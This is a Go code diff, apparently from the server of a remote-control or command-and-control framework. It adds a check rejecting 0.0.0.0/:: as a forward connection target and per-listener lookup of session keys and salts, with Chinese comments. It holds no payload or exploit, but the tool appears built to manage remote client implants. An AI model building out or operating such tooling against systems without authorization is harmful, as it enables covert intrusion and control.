@@ -4,6 +4,7 @@ import (
 	k "BackendTemplate/pkg/connection/kcp"
 	"BackendTemplate/pkg/connection/tcp"
 	"BackendTemplate/pkg/connection/websocket"
+	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/encrypt"
 	"BackendTemplate/pkg/security"
 	"bufio"
@@ -94,9 +95,17 @@ func ConnectForwardClient(c *gin.Context) {
 
 	// 构建连接地址
 	targetAddress := fmt.Sprintf("%s:%s", req.IPAddress, req.Port)
+	if isUnspecifiedForwardTarget(targetAddress) {
+		c.JSON(http.StatusBadRequest, gin.H{
+			"status":  400,
+			"message": "回连地址不能是 0.0.0.0/::（那是客户端绑定地址，不是服务端可拨目标）",
+		})
+		return
+	}
 
-	// 手动连接支持显式会话密钥（与服务端/客户端 patched 密钥一致）；空则用监听器配置
-	masterKey, salt := padForwardKeys(req.Vkey, req.EncryptionSalt)
+	// 手动连接支持显式会话密钥（与服务端/客户端 patched 密钥一致）；
+	// 空值先按目标地址找该监听器记录自己的密钥，找不到才交给连接路径按类型回落。
+	masterKey, salt := resolveForwardConnectKeys(targetAddress, req.Vkey, req.EncryptionSalt)
 
 	// 根据连接方式进行连接
 	var err_connect error
@@ -154,6 +163,24 @@ func padForwardKeys(vkey, encryptSalt string) ([]byte, []byte) {
 	salt := make([]byte, 16)
 	copy(salt, []byte(encryptSalt))
 	return masterKey, salt
+}
+
+// resolveForwardConnectKeys 手动连接用哪套密钥：
+//  1. 请求显式给了真实 VKey/盐（未脱敏）→ 用它；
+//  2. 否则按目标地址查监听器记录，用记录自己的密钥——同协议可以有多条正向监听器，
+//     按类型取库中第一条会让第二条起用错密钥；
+//  3. 都取不到返回 nil，交给连接路径按类型回落（历史记录兼容）。
+func resolveForwardConnectKeys(targetAddress, vkey, salt string) ([]byte, []byte) {
+	if mk, s := padForwardKeys(vkey, salt); mk != nil {
+		return mk, s
+	}
+	if database.DB() != nil {
+		if lis, has, _ := database.Listeners().FindByConnectOrListen(targetAddress); has &&
+			lis.VKey != "" && lis.EncryptionSalt != "" {
+			return encrypt.NormalizeListenerKeyConfig([]byte(lis.VKey), []byte(lis.EncryptionSalt))
+		}
+	}
+	return nil, nil
 }
 
 // connectTCPForward 连接TCP正向客户端（复用反向 TCP 协议处理，协议帧完全一致）
